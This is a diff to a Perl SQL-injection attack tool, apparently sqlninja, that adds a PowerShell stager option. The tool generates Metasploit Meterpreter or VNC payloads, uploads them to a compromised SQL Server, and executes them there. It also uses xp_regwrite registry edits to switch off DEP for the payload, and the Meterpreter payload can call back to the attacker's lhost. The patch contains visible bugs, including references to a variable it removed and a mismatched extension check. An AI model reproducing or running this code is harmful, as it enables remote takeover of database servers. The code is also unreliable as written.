@@ -102,6 +102,19 @@ sub metasploit
 		print "[-] msfencode not found\n";
 		exit(-1);
 	}
+	my $fileformat = "";
+	print "[+] Which file format you want to use?\n";
+	print "    1: Powershell\n     2: PE executable\n";
+	while (($fileformat !=1) and ($fileformat != 2)) {
+		print "> ";
+		$fileformat = <STDIN>;
+		chomp($fileformat);
+	}
+	if ($fileformat == 1) {
+		$fileformat = ".ps1";
+	} else {
+		$fileformat = ".exe";
+	}
 	print "[+] Which payload you want to use?\n";
 	print "    1: Meterpreter\n    2: VNC\n";
 	my $payload;
@@ -153,33 +166,40 @@ sub metasploit
 	# We start creating the payload executable
 	# We use a random name, because using the same name twice would
 	# create problems if the first executable is still running
-	my $exe = "met".int(rand()*65535);
+	my $stager = "met".int(rand()*65535).$fileformat;
 	my $command = $msfpayload." windows/".$payload."/".$conn.
 		" exitfunc=process lport=".$port." ";
 	if ($conn ne "bind_tcp") {
 		$command .= " lhost=".$conf->{'lhost'}." ";
 	}
-	if ($conf->{'msfencoder'} eq "") {
-		$command .= " X > /tmp/".$exe.".exe";
+	my $stagertype;
+	if ($fileformat eq ".exe") {
+		$stagertype = "exe";
+	} else {
+		$stagertype = "psh";
+	}
+	# Now, it seems that you need msfencoder to use Powershell...
+	if (($conf->{'msfencoder'} eq "") and ($fileformat eq "exe")) {
+		$command .= " X > /tmp/".$stager;
 	} else {
 		$command .= " R | ".$msfencode.
 			    " -e ".$conf->{'msfencoder'}.
 			    " -c ".$conf->{'msfencodecount'}.
-			    " -t exe".
-			    " -o /tmp/".$exe.".exe";
+			    " -t ".$stagertype.
+			    " -o /tmp/".$stager;
 	}
 	if ($conf->{'verbose'} == 1) {
 		print "[v] Command: ".$command."\n";
 	}
 	print "[+] Calling msfpayload3 to create the payload...\n";
 	system ($command);
-	unless (-e "/tmp/".$exe.".exe") {
+	unless (-e "/tmp/".$stager) {
 		print "[-] Payload creation failed\n";
 		exit(-1);
 	}
-	print "[+] Payload (".$exe.".exe) created. Now uploading it\n";
-	upload("/tmp/".$exe.".exe");
-	system ("rm /tmp/".$exe.".exe");
+	print "[+] Payload (".$stager.") created. Now uploading it\n";
+	upload("/tmp/".$stager);
+	system ("rm /tmp/".$stager);
 
 	my $cmd;
 	if ($conf->{'checkdep'} eq "yes") {
@@ -194,7 +214,7 @@ sub metasploit
 						.$conf->{'blindtime'}."'";
 		my $result = tryblind($cmd);
 		if ($result > ($conf->{'blindtime'} - 2)) {
-			handledep($exe);
+			handledep($stager);
 		} else {
 			print "[+] No DEP detected.... good\n";
 		}
@@ -218,9 +238,13 @@ sub metasploit
 			print "[+] waiting ".$delayserver." seconds before running the stager on the server\n"; 
 			sleep($delayserver);
 		}
-		$cmd = "%TEMP%\\".$exe.".exe";
-		if ($conf->{'churrasco'} == 1) {
-			$cmd = usechurrasco($cmd);
+		if ($fileformat eq ".exe") {
+			$cmd = "%TEMP%\\".$stager;
+			if ($conf->{'churrasco'} == 1) {
+				  $cmd = usechurrasco($cmd);
+			}
+		} else {
+			$cmd = "powershell.exe -noexit -file %TEMP%\\".$exe.".ps1";
 		}
 		$command = createcommand($cmd);
 		sendrequest($command);
@@ -294,7 +318,7 @@ sub runmsfconsole
 # Windows Server 2003 SP1+ has DEP enabled.... we need to take care of this
 sub handledep
 {
-	my $exe = $_[0];
+	my $stager = $_[0];
 	my $dep;
 	my $cmd;
 	my $result;
@@ -348,7 +372,7 @@ sub handledep
 	$cmd = "declare \@b nvarchar(999) ".
 	  "create table ".$table." (a nvarchar(999)) ". 
 	  "insert into ".$table." exec master..".$conf->{'xp_name'}." 'echo %TEMP%' ".
-	  "set \@b = (select top 1 * from ".$table.")+'\\".$exe.".exe' ".
+	  "set \@b = (select top 1 * from ".$table.")+'\\".$stager.".exe' ".
 	  "exec master..xp_regwrite 'HKEY_LOCAL_MACHINE',".
 	  "'Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers',".
 	  "\@b,'REG_SZ','DisableNXShowUI' ".
